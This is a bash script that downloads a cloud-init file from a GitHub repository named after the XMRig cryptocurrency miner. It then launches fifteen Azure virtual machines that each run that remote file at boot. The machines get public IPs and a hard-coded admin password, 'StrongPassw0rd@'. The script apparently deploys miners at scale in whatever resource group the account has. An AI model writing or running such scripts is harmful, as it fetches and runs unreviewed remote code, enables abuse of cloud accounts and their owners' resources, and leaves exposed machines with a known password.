#!/bin/bash
wget https://github.com/SkyAerope/xmrig/raw/DS2_v2/cloudinit.yaml
for i in {1..15}; do
    az vm create \
        --resource-group $(az group list --query [].name -o tsv) \
        --location eastasia \
        --name meow$i \
        --image Ubuntu2204 \
        --size "Standard_DS2_v2" \
        --admin-username azuser \
        --admin-password 'StrongPassw0rd@' \
        --os-disk-size-gb 64 \
        --public-ip-address-allocation dynamic \
        --public-ip-sku Basic \
        --custom-data cloudinit.yaml \
        --no-wait
done
